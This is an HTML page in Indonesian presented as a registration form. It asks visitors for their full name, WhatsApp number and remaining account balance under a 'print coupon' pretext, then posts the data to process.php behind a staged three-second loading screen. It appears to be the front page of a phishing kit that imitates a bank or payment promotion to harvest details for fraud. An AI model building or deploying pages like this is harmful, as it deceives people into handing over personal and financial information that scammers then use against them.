<!DOCTYPE html><html lang="id"><head>
    <meta charset="UTF-8">
    <meta name="theme-color" content="#0f78cb">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>FORMULIR PENDAFTARAN</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: url('https://blogger.googleusercontent.com/img/a/AVvXsEiPmnethgFKiKXJ_bJw6STryxjV7ZHDQRTolxBWPIeZwxYUf2-QNbtvcOgw8E10SBjZzbRKsH6WDDP4S7IATlK9ZKzaoSJFDsq7i7zukc7-HRHcYSKX7vbQJe01YdjGetzSq9MfxPR-rnbvjAlOguOZ1edEK_idIOy_a5MaV0ldg7JvIAmEW9fXFMZ2B5du') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            background: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            width: 300px;
            margin-left:3%;
            border: 1px solid #0f78cb;
            text-align: center;
        }
        .input-group {
            display: flex;
            align-items: center;
            border-bottom: 2px solid #0f78cb;
            margin-bottom: 15px;
            padding: 5px;
        }
        .input-group img {
            width: 24px;
            height: 24px;
            margin-right: 10px;
        }
        .input-group input {
            border: none;
            outline: none;
            width: 100%;
            font-size: 16px;
            padding: 5px;
            background: transparent;
        }
        button {
            background-color: #0F78CB;
            color: white;
            padding: 13px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            font-size: 15px;
            width: 100%;
        }
        button:hover {
            background-color: #0F78CB;
        }
        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }
        .loading img {
            width: 80px;
        }
        nav {
            width: 100%;
            position: fixed;
            background-color: faded dark blue;
            z-index: 1000;
            
        }
        nav.top {
            top: 0;
            border-bottom: 1px solid #ddd;
        }
        nav.bottom {
            bottom: 0;
            border-top: 1px solid #ddd;
        }
        nav img {
            width: 100%;
            height: auto;
            display: block;
        }
        h1{
          font-size: 16px;
          color: white;
          text-align: center;
          margin-top:-7%;
        }
    </style>
    <script>
        function formatRupiah(input) {
            let value = input.value.replace(/\./g, ''); // Hapus titik lama
            value = parseInt(value) || 0; // Konversi ke angka
            input.value = value.toLocaleString('id-ID'); // Format ke ribuan dengan titik
        }

        function submitForm() {
            document.querySelector('.loading').style.display = 'flex'; // Tampilkan loading
            setTimeout(() => {
                document.getElementById('formData').submit(); // Kirim form setelah 3 detik
            }, 3000);
        }
        
        
    document.addEventListener("DOMContentLoaded", function () {
        const form = document.getElementById("formData");
        const inputs = form.querySelectorAll("input");
        const submitButton = form.querySelector("button");

        function validateForm() {
            let allFilled = true;
            inputs.forEach(input => {
                if (input.value.trim() === "") {
                    allFilled = false;
                }
            });
            submitButton.disabled = !allFilled; // Nonaktifkan jika ada yang kosong
            submitButton.style.opacity = allFilled ? "1" : "0.5"; // Ubah tampilan tombol
        }

        inputs.forEach(input => {
            input.addEventListener("input", validateForm);
        });

        validateForm(); // Pastikan tombol dinonaktifkan saat halaman dimuat
    });

    </script>
</head>
<body>
      <nav class="top">
        <img src="" alt="">
        
                      <img width="100%" src="https://blogger.googleusercontent.com/img/a/AVvXsEgqFbspYYwrSW30Q_vZwCbESxrJFJLIT39pdBuE_iOfb2sx1HFNNYED_s_6pZLUUH-Syu6eNHLk_-nXwj_uT-ubRYWn_BId1nGW8QxfVVxZWT2Z_QD706hv30-06odGUlRq6WB7KH4neqYAQcZOV9Vq9Rr84YirmYxVMpYk0J6aw7mYpSRCy6Ey5DVKXWfB" alt=""><br><br>
<h1></h1>
    <div class="container">
        <form id="formData" action="process.php" method="POST">
            <div class="input-group">
                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhLKbRtIDUQ06yokVd_LFwUR6xS6DP-HctxELM8Ij5c8rG2b2I41DJmCONvygzKD3YvmUjuYb1HTb_L6FxQ-Qr_PS2O82woidcF0xTW5XmyT07V9Tbq8fkz3xzGs66vuAqjCqCyFRhrwv4X9rUXizyT8xkwqV33H4xyvW4rR0NzZLFdR3Yfwv0zOeXCfnWa" alt="User Icon">
                <input type="text" name="nama" placeholder="Nama Lengkap" required="">
            </div>
            <div class="input-group">
                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgDtmu6vFr3Iz9-bNcV_vgHYsBzOlJgVJYQSjlrekhlvPrX7Ggt0bsPsfIv2dG5gN7LCEdA2Xwvwt2bnniGHMju77t8J3lUBfM5Gg1fjVEL-Fb2NRdzYVvLfq_5qgp8ang8RJ4R3xeNtpVxY0RMwntZhjuV-2hCCiKVYK5qpaCGhk9lwEJ2EoXTLSbDycPF" alt="Phone Icon">
                <input type="tel" name="nomor" placeholder="Nomor Whatsapp" required="">
            </div>
            <div class="input-group">
                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEiaZnIo3CA-CGPQ42UeAPSxFIK2gaLX_OgpRQkOCdzhgStZiUaWxxr1eoaFpxHJISPoSEGGlNKRowZ3MrgpfWDKRrN2gQPiV5gSKnAMmJd8_rRPfJWddTDl3qv2pTODP74gPenrioJ0tmcIHVEb8ERWKI5FyWx6rmxwrUC871h2BCNSufVvf9HhJgJPP61m" alt="Saldo Icon">
                <input type="tel" name="saldo" placeholder="Sisa Saldo Terakhir" required="" oninput="formatRupiah(this)">
            </div><br><br>
            <button type="button" onclick="submitForm()">Lanjut Cetak Kupon</button>
        </form>
    </div>

    <div class="loading">
        <img src="images/03-42-07-846_512.gif" alt="">
    </div>
    <nav class="footer">
        <img src="" alt="">
    </nav>



</nav></body></html>
